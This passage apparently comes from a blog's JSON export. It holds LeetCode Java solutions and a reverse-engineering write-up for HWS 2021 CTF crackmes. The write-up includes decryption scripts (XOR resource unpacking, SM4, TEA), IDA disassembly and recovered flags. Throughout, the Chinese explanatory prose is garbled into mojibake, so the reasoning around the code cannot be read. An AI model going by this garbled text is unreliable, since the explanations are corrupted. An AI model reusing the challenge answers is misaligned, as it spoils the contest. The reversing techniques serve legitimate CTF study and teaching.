é¦–å­—æ¯å­˜åœ¨å°±ç›´æ¥è¿›è¡Œdfséå† * éå†çš„æ–¹å‘åªæœ‰å››ä¸ªæ–¹å‘ * è¿˜éœ€è¦å›æº¯ï¼Œå¦‚æœé“è·¯ä¸ç¬¦åˆéœ€è¦æŠŠä¹‹å‰èµ°è¿‡çš„è·¯å…¨éƒ¨æ¸…0 * */ char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; int[][] book = new int[height][width]; if (existDfs(board,i,j,book,wordArray,0))&#123; return true; &#125; &#125; &#125; return false; &#125;&#125; è§£ç å¼‚æˆ–åçš„æ•°ç»„ ç®€å•çš„ç­¾åˆ°é¢˜ 1234567891011class Solution &#123; public int[] decode(int[] encoded, int first) &#123; int decodedLength = encoded.length + 1; int[] decoded = new int[decodedLength]; decoded[0] = first; for (int i = 0; i &lt; encoded.length; i++) &#123; decoded[i+1] = encoded[i] ^ decoded[i]; &#125; return decoded; &#125;&#125; æ•°ç»„å¼‚æˆ–æ“ä½œ ä¸¤å¤©éƒ½æ˜¯ç®€å•çš„ç­¾åˆ°é¢˜ï¼Ÿæ„Ÿè§‰è¿™é“é¢˜éšä¾¿éƒ½å¯ä»¥è·‘åˆ°100% 123456789class Solution &#123; public int xorOperation(int n, int start) &#123; int retNum = start; for (int i = 1; i &lt; n; i++) &#123; retNum ^= start+i*2; &#125; return retNum; &#125;&#125; èºæ—‹çŸ©é˜µâ… å¼€å§‹èºæ—‹çŸ©é˜µä¸‰éƒ¨æ›²å†²å†²å†²ğŸ±â€ğŸ ç»å…¸é¢˜ç›®ï¼Œå­¦Cè¯­è¨€çš„æ—¶å€™çœ‹è¿‡æ²¡å†™è¿‡ï¼Œå†™å…³äºçŸ©é˜µçš„ä¸œè¥¿éœ€è¦æ‰¾åˆ°çŸ©é˜µå˜åŒ–è§„å¾‹ã€‚ ç½‘ä¸Šæ‰¾çš„å›¾ï¼Œå°±æ˜¯æŠŠå››æ¡è¾¹åŠ¨æ€åŒ–ï¼ˆåæ­£è¿™ä¸ªæ€è·¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ï¼‰ã€‚çŸ©é˜µçš„ä¸Šä¸‹ä¸¤æ¡è¾¹å¯¹åº”ï¼Œå·¦å³ä¸¤æ¡è¾¹å¯¹åº”ï¼Œä¸€è¾¹åœ¨åŠ åˆ™å¦ä¸€è¾¹å‡ï¼Œç›´åˆ°ä¸¤æ¡è¾¹é‡åˆã€‚ 123æ€è·¯:å®šä¹‰çŸ©é˜µçš„å››æ¡è¾¹æ¯å½“éå†å®Œä¸€å±‚è¿™æ¡è¾¹å°±å‡1 123456789101112131415161718192021222324252627282930313233class Solution &#123; public List&lt;Integer&gt; spiralOrder(int[][] matrix) &#123; /* * å®šä¹‰å››ä¸ªè¾¹ç•Œ * ä¸¤ä¸¤å¯¹åº” * ä¸€è¾¹åŠ å°±ä¸€è¾¹å‡*/ int up = 0,down = matrix.length - 1; int left = 0,right = matrix[0].length - 1; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); while (true)&#123; for (int i = left; i &lt;= right; i++) &#123; list.add(matrix[up][i]); &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down; i++) &#123; list.add(matrix[i][right]); &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; list.add(matrix[down][i]); &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; list.add(matrix[i][left]); &#125; if (++left &gt; right)break; &#125; return list; &#125;&#125; èºæ—‹çŸ©é˜µâ…¡ å’Œèºæ—‹çŸ©é˜µâ… çš„æ€è·¯æ˜¯ä¸€æ ·çš„ 12345678910111213141516171819202122232425262728293031class Solution &#123; public int[][] generateMatrix(int n) &#123; int left = 0,right = n - 1; int up = 0, down = n - 1; int[][] matrix = new int[n][n]; int num=1; while (true)&#123; for (int i = up; i &lt;= right; i++) &#123; matrix[up][i] = num++; &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down ; i++) &#123; matrix[i][right] = num++; &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; matrix[down][i] = num++; &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; matrix[i][left] = num++; &#125; if (++left&gt;right)break; &#125; return matrix; &#125;&#125; èºæ—‹çŸ©é˜µâ…¢ ä¸¤ç§æ€è·¯ï¼š å’Œä¸Šé¢çš„æ€è·¯ä¸€æ ·ï¼ŒåŠ¨æ€æ¨¡æ‹Ÿå››æ¡è¾¹ æ‰¾è§„å¾‹ï¼Œé€šè¿‡è§‚å¯Ÿå¯çŸ¥ï¼Œæ¯æ¬¡å³ç§»å’Œä¸‹ç§»èµ°çš„æ­¥æ•°æ˜¯å¥‡æ•°ï¼Œå·¦ç§»å’Œä¸Šç§»èµ°çš„æ­¥æ•°æ˜¯å¶æ•°ï¼Œæ‰€ä»¥å¯ä»¥ä»¥èµ·å§‹ç‚¹ä¸ºä¸­å¿ƒï¼ˆä¸Šå›¾å…¶å®éƒ½è¡¨ç¤ºå‡ºæ¥äº†ï¼‰ï¼Œå®šä¹‰ä¸€ä¸ªæ­£æ–¹å½¢ï¼Œéå†è¿™ä¸ªæ­£æ–¹å½¢çš„æ‰€æœ‰åæ ‡ï¼Œå¦‚æœåæ ‡èŒƒå›´åœ¨çŸ©å½¢å†…ï¼Œåˆ™ç¬¦åˆæ¡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Solution &#123; public boolean checkPost(int R,int C,int r0,int c0)&#123; if (r0&gt;=R || r0&lt;0 || c0&gt;=C || c0&lt;0) return false; else return true; &#125; public int[][] spiralMatrixIII(int R, int C, int r0, int c0) &#123; // è¾“å…¥å‚æ•°ï¼ŒçŸ©é˜µå®½é«˜ï¼Œèµ·å§‹ä½ç½® /* * å°†ä¸è§„åˆ™çŸ©é˜µçœ‹æˆæ­£æ–¹å½¢ * æ¨¡æ‹Ÿä¸Šä¸‹å·¦å³è¾¹ç•Œ * å•ç‹¬è®¾ç½®ä¸€ä¸ªæŠ€æœ¯å˜é‡åˆ¤æ–­æ˜¯å¦éå†å®Œæˆ * éå†æ–¹å‘ï¼šå³ï¼Œä¸‹ï¼Œå·¦ï¼Œä¸Š*/ int[][] arr = new int[R*C][2]; int num = 0; int max = R&gt;=C?R:C; arr[num][0] = r0; arr[num][1] = c0; for (int i = 1; i &lt;= max*2; i+=2) &#123; for (int j = 1; j &lt;= i; j++) &#123; c0+=1; if (checkPost(R,C,r0,c0))&#123; ++num; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt;= i; j++) &#123; r0 += 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; c0 -=1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; r0 -= 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; &#125; return arr; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"}]},{"title":"HWSè®¡åˆ’2021ç¡¬ä»¶å®‰å…¨å†¬ä»¤è¥çº¿ä¸Šé€‰æ‹”èµ›","slug":"CTF/wp/HWSCTF","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:16:09.435Z","comments":true,"path":"23409/","link":"","permalink":"http://example.com/23409/","excerpt":"","text":"babyre ä¸€é“hooké¢˜ï¼Œidaæ‰“å¼€ä»£ç è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œé¦–å…ˆåˆ¤æ–­é•¿åº¦ç„¶ååœ¨åŠ å¯†ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ææ¸…æ¥šè¿™ä¸ªhookçš„æµç¨‹ï¼Œå¬åˆ«çš„å¸ˆå‚…è¯´çš„åœ¨CRTçš„æ—¶å€™ï¼Œä»r3åˆ°r0æ—¶å€™hookçš„ğŸ˜¥ï¼ˆå¬çš„ä¸æ˜¯å¾ˆæ‡‚ï¼‰ï¼Œä½†æ˜¯æˆ‘çæ‰¾æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•° èµ„æºè§£å¯† èµ„æºåŠ è½½ å¯ä»¥çœ‹å‡ºç¨‹åºåŠ è½½äº†ä¸€ä¸ªå«CIPHER_DLLçš„èµ„æº,è¿™ä¸ªèµ„æºå…¶å®å°±æ˜¯ç»è¿‡åŠ å¯†çš„DLLï¼Œæˆ‘ç”¨ResourceHacker(ä¸€ä¸ªå¯ä»¥æŸ¥çœ‹ç¨‹åºèµ„æºçš„å·¥å…·)æ¥æŸ¥çœ‹ç¨‹åºä¸­çš„èµ„æº ç¨‹åºä¸­ç¡®å®æœ‰ä¸€ä¸ªå«CIPHER_DLLçš„èµ„æº,ä¸”è¿™ä¸ªèµ„æºéœ€è¦è§£å¯†æ‰èƒ½ä½¿ç”¨,å›¾ä¸­**wow!**å°±æ˜¯è¯æ˜,æŠŠè¿™ä¸ªèµ„æºçš„äºŒè¿›åˆ¶æ–‡ä»¶æå‡ºæ¥,åœ¨è§£å¯†å›å»,å¾—åˆ°ä¸€ä¸ªDLL 1234567891011121314import structimport os//è§£å¯†èµ„æºdef ResourceDecrypt(): filepath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\CIPHER_DLL101&#x27; dllpath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\DLL.dll&#x27; key = &#x27;wow!&#x27; size = os.path.getsize(filepath) # è·å¾—æ–‡ä»¶å¤§å° with open(filepath, &#x27;rb&#x27;) as cipher_stream: with open(dllpath, &#x27;wb&#x27;) as dll_stream: for i in range(size): data = struct.unpack(&#x27;B&#x27;, cipher_stream.read(1))[0] ^ ord(key[i%4]) dll_stream.write(struct.pack(&#x27;B&#x27;, data)) æŠŠDLLç”¨idaæ‰“å¼€,æŸ¥çœ‹åŠ å¯†å‡½æ•°,å­—ç¬¦ä¸²å·²ç»å‘Šè¯‰æˆ‘ä»¬æ˜¯SM4åŠ å¯†,æ²¡æœ‰é­”æ”¹. SM4Githubä»£ç é“¾æ¥ 1234567891011121314151617181920212223242526from ida import ida_bytesimport pysm4# ä»idaä¸­æå–åŠ å¯†åçš„æ•°æ®def Dump_ida_data(): addr = 0x00BFA808 res = [] for i in range(32): res.append(get_byte(addr + i)) print(bytes(res).hex()) # åˆ©ç”¨GitHubä¸Šæ‰¾çš„sm4è„šæœ¬,å†™çš„è§£å¯†å‡½æ•° def Decrypt(): string = b&#x27;Ez_5M4_C1pH@r!!!&#x27;.hex() key = 0x457a5f354d345f433170484072212121 cipher1 = 0xea6358b78ce2a1e9c5298f53e8083259 cipher2 = 0xaf1b67aed9dacfc472ffb1ec7673f306 plain1 = hex(pysm4.decrypt(cipher1, key))[2:] plain2 = hex(pysm4.decrypt(cipher2, key))[2:] for i in range(0,len(plain1),2): print(chr(int(plain1[i:i+2],16)),end=&#x27;&#x27;) for i in range(0,len(plain1),2): print(chr(int(plain2[i:i+2],16)),end=&#x27;&#x27;) # flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125; child_protectå‚è€ƒçœ‹é›ªçš„ä¸€ç¯‡æ–‡ç« ï¼šhttps://bbs.pediy.com/thread-95082.htm è¿™é“é¢˜è€ƒçš„æ˜¯åŒè¿›ç¨‹å®ˆæŠ¤é—®é¢˜ï¼Œä¸Šé¢çš„æ–‡ç« å’Œè¿™é“é¢˜ç±»ä¼¼ï¼Œä½†æ˜¯éš¾ç‚¹åœ¨äºè°ƒè¯•ã€‚ idaæ‰“å¼€åå‘ç°ä¸»å‡½æ•°æ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œè€Œä¸”çœ‹åˆ°äº†int3ä¸­æ–­å¼‚å¸¸æŒ‡ä»¤ã€‚ç”±äºæ˜¯åŒè¿›ç¨‹å®ˆæŠ¤ï¼Œéœ€è¦æ‰¾åˆ°åˆ›å»ºå­è¿›ç¨‹çš„åœ°æ–¹ é€šè¿‡æœç´¢CreateProcesså‡½æ•°ï¼Œç¡®å®šå­è¿›ç¨‹ç”±å‡½æ•°sub_413670åˆ›å»º ç»§ç»­è·Ÿè¸ªï¼Œç¡®å®šäº†ä¸¤ä¸ªå‡½æ•°è°ƒç”¨å­è¿›ç¨‹ï¼Œåˆ†åˆ«æ˜¯sub_413BE0å’Œsub_413950 è€Œå‡½æ•°sub_413950æ˜¯ä¸€ä¸ªå…³é”®å‡½æ•°ï¼Œä»–å¯¹å­è¿›ç¨‹åšäº†ä¿®æ”¹ã€‚å¦‚æœæƒ³è®©idaæ­£ç¡®çš„åç¼–è¯‘ï¼Œæˆ‘ä»¬éœ€è¦nopæ‰æ‰€æœ‰çš„int3æŒ‡ä»¤ï¼Œä¸”æŒ‰ç…§ç¨‹åºä¿®æ”¹éƒ¨åˆ†æŒ‡ä»¤ï¼Œè¿™é‡Œæˆ‘ç”¨010Editorè¿›è¡Œä¿®æ”¹ã€‚ é¦–å…ˆæ‰¾åˆ°æ‰€æœ‰çš„int3æŒ‡ä»¤ ä¸Šå›¾å°±æ˜¯éœ€è¦æˆ‘ä»¬é¦–å…ˆnopæ‰çš„åœ°æ–¹ï¼Œç”¨010Editorä¿®æ”¹åå†æ¬¡ç”¨idaæ‰“å¼€å¯ä»¥å‘ç°ä¸»å‡½æ•°å·²ç»å¯ä»¥æ­£å¸¸åç¼–è¯‘ï¼Œä½†æ˜¯è¿˜ä¸èƒ½å¤ŸåŠ¨æ€è°ƒè¯•ï¼Œ å› ä¸ºæ‰€æœ‰çš„è¿‡ç¨‹éƒ½æ˜¯åœ¨å­è¿›ç¨‹ä¸­è¿›è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨å·²ç»ä¿®æ”¹äº†çˆ¶è¿›ç¨‹çš„æ•°æ®å’Œå­è¿›ç¨‹ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥è·³è¿‡è°ƒç”¨å­è¿›ç¨‹çš„æ­¥éª¤ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€éƒ¨åˆ†æ•°æ®ã€‚ ç»è¿‡å¤šæ¬¡ä¸‹æ–­ç‚¹è°ƒè¯•åï¼Œå®šä½åˆ°å‡½æ•°sub_413D10ï¼Œä¿®æ”¹è¿‡åå°±å¯ä»¥è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªå‘ã€‚ã€‚ æ¯æ¬¡è°ƒè¯•åˆ°è¿™é‡Œçš„æ—¶å€™éƒ½ä¼šé—ªé€€ï¼Œæ— è®ºæ€ä¹ˆè°ƒéƒ½æ²¡æœ‰ç”¨ï¼Œæœ€åæˆ‘é€‰æ‹©çš„åŠæ³•æ˜¯ç›´æ¥patchæ‰è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æŒ‡ä»¤ï¼Œå› ä¸ºè¿™æ­¥æ¯”è¾ƒç®€å•ï¼Œä¸”ä¸å½±å“åé¢çš„æ•°æ®ã€‚ åœ¨å¯ä»¥åŠ¨è°ƒåï¼Œå°±å¯ä»¥åˆ†æç®—æ³•äº†ï¼Œç®—æ³•æœ‰ä¸¤å¤„ï¼Œä¸€å¤„å¼‚æˆ–ï¼Œä¸€å¤„teaåŠ å¯†ï¼Œå¼‚æˆ–å‡½æ•°æˆ‘å°†ä»–pachï¼Œç›´æ¥çœ‹teaå¤„ teaåŠ å¯†çš„keyæ˜¯åœ¨è¿è¡Œæ—¶ç”Ÿæˆçš„ï¼Œä½†æ˜¯å¦‚æœä¸åŠ¨æ€è°ƒè¯•ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶æ•´ä¸ªå‡½æ•°è·‘ä¸€éä¹Ÿå¯ä»¥ï¼Œæˆ‘å–œæ¬¢åŠ¨æ€è°ƒè¯•ï¼ˆæ‡’ï¼‰ ç”Ÿæˆäº†8ä¸ªæ•°æ®ï¼Œä½†æ˜¯åªç”¨åˆ°äº†å‰å››ä¸ªï¼Œåé¢åªéœ€è¦æ‰¾åˆ°åŠ å¯†åçš„æ•°æ®å°±okäº†ï¼Œè¿™é‡Œæˆ‘ç”¨idapython 1234567891011121314151617181920212223242526272829import idc from ida_bytes import *import idaapi def DumpCipher(): addr = [] res = [] start = 0x4122C8 end = 0x4123AE curr_addr = start dword = &#x27;&#x27; while curr_addr &lt;= end: addr.append(curr_addr) curr_addr = idc.next_head(curr_addr,end) for i in range(32): if i%4==0 and i != 0: print(dword) res.append(int(dword, 16)) dword = &#x27;&#x27; data = idc.print_operand(addr[i], 1).replace(&#x27;h&#x27;, &#x27;&#x27;) if len(data) == 1: data = &#x27;0&#x27; + data elif len(data) == 3: data = data[1:] dword = dword + data # print(dword) res.append(int(dword, 16)) print(res) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void TEA_decrypt(uint32_t* v, uint32_t* k)&#123; uint32_t sum = 0xC6EF3720, delta = 0x9E3779B9; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;void XOR(uint32_t *arr) &#123; uint32_t sum = 0x73FF8CA6; for (int i = 0; i &lt; 8; i++) &#123; arr[i] ^= sum; sum -= 0x50FFE544; &#125; &#125;int main()&#123; uint32_t key[4] = &#123; 0x82aba3fe, 0xac1ddca8, 0x87ec6b60, 0xa2394568 &#125;; uint32_t c1[2] = &#123; 3991505723, 3531991019 &#125;; uint32_t c2[2] = &#123; 1360416890, 2984008969 &#125;; uint32_t c3[2] = &#123; 1169078549, 1301151568 &#125;; uint32_t c4[2] = &#123; 3739270283, 2612854497 &#125;; uint32_t v = 0; TEA_decrypt(c1, key); TEA_decrypt(c2, key); TEA_decrypt(c3, key); TEA_decrypt(c4, key); uint32_t arr[] = &#123; 0x3e9affcb, 0x478dce18, 0xb891a541, 0xc191b885, 0x6b9a84ff, 0xad61703e, 0xeb5f6c7d, 0x62772dbb &#125;; XOR(arr); for (int i = 0; i &lt; 8; i++) &#123; printf(&quot;%x&quot;, arr[i]); &#125; //æ‰“å°çš„æ˜¯flagçš„16è¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œå†ç”¨pythonè½¬æˆå­—ç¬¦ä¸² return 0;&#125; flag: Mesmerizing_And_Desirable_As_wjq Enigmaè¿™é¢˜æœ‰æ„æ€ å¼‚å¸¸å¤„ç†åè°ƒè¯•ï¼Œå‡½æ•°sub_AE10C0è°ƒç”¨äº†SetUnhandledExceptionFilterå‡½æ•°ï¼Œæ„æ€å°±æ˜¯å‘ç”Ÿå¼‚å¸¸æ—¶è°ƒç”¨æ³¨å†Œçš„å‡½æ•°ï¼Œçœ‹çœ‹æ³¨å†Œçš„å‡½æ•° æ³¨å†Œçš„å‡½æ•°æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œä½†æ˜¯è¿™ä¸ªè™šæ‹Ÿæœºå¾ˆç‰¹æ®Šï¼Œé‡Œé¢çš„handlæ˜¯åŠ å‡è¿ç®—å’Œä½è¿ç®—ï¼Œå‚æ•°æ˜¯å„ç§å¯„å­˜å™¨ å›åˆ°å‡½æ•°sub_AE10C0å‘ç°äº†C7è¿™ä¸ªå­—èŠ‚ç è§¦å‘éæ³•æŒ‡ä»¤å¼‚å¸¸ï¼Œç„¶åè°ƒç”¨æ³¨å†Œçš„å‡½æ•°ç›¸å½“äºç”¨é‚£ä¸ªè™šæ‹Ÿæœºæ¨¡æ‹Ÿäº†ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œç›´æ¥è¿˜åŸåé™æ€çœ‹æ±‡ç¼–å°±OK 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130 push ebp.text:004018F1 mov ebp, esp.text:004018F3 push ebx.text:004018F4 push esi.text:004018F5 push edi.text:004018F6 push offset sub_401630.text:004018FB call ds:SetUnhandledExceptionFilter.text:004018FB ; ---------------------------------------------------------------------------.text:00401901 db 0C7h ; and eax, 0.text:00401902 db 0FFh.text:00401903 db 4 .text:00401904 db 1.text:00401905 db 0.text:00401906 ; ---------------------------------------------------------------------------.text:00401906 xor ecx, ecx.text:00401908.text:00401908 loc_401908: ; CODE XREF: .text:00401922â†“j.text:00401908 cmp ecx, 20h ; &#x27; &#x27;.text:0040190B jge short loc_401924.text:0040190B ; ---------------------------------------------------------------------------.text:0040190D db 0C7h ; add eax, 11h.text:0040190E db 0FFh .text:0040190F db 0.text:00401910 db 1.text:00401911 db 11h.text:00401912 db 0C7h ; and eax,1Fh.text:00401913 db 0FFh.text:00401914 db 4.text:00401915 db 1.text:00401916 db 1Fh.text:00401917 ; ---------------------------------------------------------------------------.text:00401917 mov dword ptr (byte_457A4C+24h)[ecx*4], eax.text:00401917 ; ---------------------------------------------------------------------------.text:0040191E db 0C7h ; inc ecx.text:0040191F db 0FFh.text:00401920 db 2.text:00401921 db 3.text:00401922 ; ---------------------------------------------------------------------------.text:00401922 jmp short loc_401908.text:00401924 ; ---------------------------------------------------------------------------.text:00401924.text:00401924 loc_401924: ; CODE XREF: .text:0040190Bâ†‘j.text:00401924 xor ecx, ecx.text:00401926.text:00401926 loc_401926: ; CODE XREF: .text:00401956â†“j.text:00401926 cmp ecx, 20h ; &#x27; &#x27;.text:00401929 jge short loc_401958.text:0040192B mov ebx, dword ptr (byte_457A4C+24h)[ecx*4].text:00401932 mov edx, dword ptr (byte_457A4C+28h)[ecx*4].text:00401939 mov al, byte_457A4C[edx].text:0040193F mov byte_4579E0[ebx], al.text:00401945 mov al, byte_457A4C[ebx].text:0040194B mov byte_4579E0[edx], al.text:0040194B ; ---------------------------------------------------------------------------.text:00401951 db 0C7h.text:00401952 db 0FFh ; add ecx, 2.text:00401953 db 0.text:00401954 db 3.text:00401955 db 2.text:00401956 ; ---------------------------------------------------------------------------.text:00401956 jmp short loc_401926.text:00401958 ; ---------------------------------------------------------------------------.text:00401958.text:00401958 loc_401958: ; CODE XREF: .text:00401929â†‘j.text:00401958 xor ecx, ecx.text:0040195A.text:0040195A loc_40195A: ; CODE XREF: .text:00401992â†“j.text:0040195A cmp ecx, 20h ; &#x27; &#x27;.text:0040195D jge short loc_401994.text:0040195F mov bl, byte_4579E0[ecx].text:0040195F ; ---------------------------------------------------------------------------.text:00401965 db 0C7h ; and ebx, 1Fh.text:00401966 db 0FFh.text:00401967 db 4.text:00401968 db 2.text:00401969 db 1Fh.text:0040196A db 0C7h ; shl bl, 3.text:0040196B db 0FFh.text:0040196C db 7.text:0040196D db 2.text:0040196E db 3.text:0040196F ; ---------------------------------------------------------------------------.text:0040196F mov esi, ecx.text:00401971 inc esi.text:00401972 and esi, 1Fh.text:00401975 mov dl, byte_4579E0[esi].text:0040197B and dl, 0E0h.text:0040197E and edx, 0FFh.text:0040197E ; ---------------------------------------------------------------------------.text:00401984 db 0C7h ; shr dl, 5 .text:00401985 db 0FFh.text:00401986 db 8.text:00401987 db 4.text:00401988 db 5.text:00401989 ; ---------------------------------------------------------------------------.text:00401989 or bl, dl.text:0040198B mov byte_457A04[ecx], bl.text:00401991 inc ecx.text:00401992 jmp short loc_40195A.text:00401994 ; ---------------------------------------------------------------------------.text:00401994.text:00401994 loc_401994: ; CODE XREF: .text:0040195Dâ†‘j.text:00401994 mov al, byte_457A04.text:00401999 mov byte_457A28, al.text:0040199E mov ecx, 1.text:004019A3.text:004019A3 loc_4019A3: ; CODE XREF: .text:004019CEâ†“j.text:004019A3 cmp ecx, 20h ; &#x27; &#x27;.text:004019A6 jge short loc_4019D0.text:004019A8 mov bl, byte_457A04[ecx].text:004019AE mov esi, ecx.text:004019AE ; ---------------------------------------------------------------------------.text:004019B0 db 0C7h ; inc ecx.text:004019B1 db 0FFh .text:004019B2 db 3 .text:004019B3 db 5.text:004019B4 ; ---------------------------------------------------------------------------.text:004019B4 xor bl, byte_457A04[esi].text:004019BA mov esi, ecx.text:004019BA ; ---------------------------------------------------------------------------.text:004019BC db 0C7h ; and esi, 3 .text:004019BD db 0FFh .text:004019BE db 4 .text:004019BF db 5.text:004019C0 db 3.text:004019C1 ; ---------------------------------------------------------------------------.text:004019C1 xor bl, byte ptr aBier[esi] ; &quot;Bier&quot;.text:004019C7 mov byte_457A28[ecx], bl.text:004019CD inc ecx.text:004019CE jmp short loc_4019A3 åŠ å¯†è¿‡ç¨‹ä¸å¤æ‚ï¼Œé¦–å…ˆè®¡ç®—äº†ä¸€ç»„0åˆ°31çš„æ— åºæ•°ï¼Œç„¶åæŒ‰ç…§æ— åºæ•°ä¸¤ä¸ªä¸€ç»„äº¤æ¢è¾“å…¥æ•°æ®ï¼Œæ¥ç€è¿›è¡Œä½è¿ç®—ï¼Œæ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼Œæœ€åè¿›è¡Œäº†å¼‚æˆ–åŠ å¯†ã€‚ 12345678910111213# è§£å¼‚æˆ–åŠ å¯†çš„è„šæœ¬def xor(): res = [] key = &#x27;Bier&#x27; Cipher = &#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27; for i in range(0,len(Cipher),2): res.append(int(Cipher[i:i+2], 16)) for i in range(1,len(res)): res[i] = res[i] ^ ord(key[(i)%4]) ^ res[i-1] return res# [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59] 123456789101112131415161718192021// ä½è¿ç®—è„šæœ¬#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; BYTE byte[] = &#123; 147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59 &#125;; BYTE index = 0; unsigned char first = byte[0] &gt;&gt; 3; printf(&quot;%c&quot;, (147 &gt;&gt;3)&amp;0xFF | (59 &lt;&lt;5)&amp;0xFF); for (int i = 0; i &lt; 31; i++) &#123; BYTE x = (byte[i] &lt;&lt; 5) &amp; 0xFF; BYTE y = (byte[i + 1] &gt;&gt; 3) &amp; 0xFF; printf(&quot;%c&quot;, x | y); &#125;&#125;// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg 1234567891011121314# äº¤æ¢ä½ç½®def Change(): flag = list(&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;) index = [] num = 0 for i in range(32): num += 0x11 num &amp;= 0x1F index.append(num) for i in range(0,32,2): flag[index[i]], flag[index[i+1]] = flag[index[i+1]], flag[index[i]] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;) flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr. æ€»ç»“â€‹ è¿™é“é¢˜è¿‡ç¨‹ä¸å¤æ‚ï¼Œè°ƒç”¨äº†SetUnhandledExceptionFilterï¼Œæ³¨å†Œå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œé€šè¿‡C7è¿™ä¸ªéæ³•æŒ‡ä»¤è§¦å‘å¼‚å¸¸ï¼Œè¿è¡Œè¿™ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œä»è€Œè¿›è¡ŒåŠ å¯†æ“ä½œ â€‹ å¦‚æœæƒ³åŠ¨æ€è°ƒè¯•çš„è¯å¯ä»¥ç›´æ¥æ”¹å­—èŠ‚ç ï¼ˆæˆ‘åªä¼šè¿™ä¸€ç§æ–¹æ³•ã€‚ã€‚ï¼‰ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ï¼Œä½†æ˜¯åšé¢˜çš„æ—¶å€™éœ€è¦ç»†å¿ƒä¸€ç‚¹ï¼Œå› ä¸ºæ±‡ç¼–çš„ä¸€äº›è¿‡ç¨‹æ²¡æœ‰çœ‹æ¸…å¯¼è‡´æµªè´¹äº†æˆ‘å¾ˆå¤šæ—¶é—´ obfuæˆ‘æå¾—æœ€çƒ¦çš„ä¸€é“é¢˜ã€‚ã€‚ä»¥å‰æ²¡æœ‰æè¿‡å¸¦ivçš„AESï¼Œä¹Ÿä»æ¥æ²¡æœ‰çœ‹è¿‡sha256å’Œmd5çš„åç¼–è¯‘ä»£ç 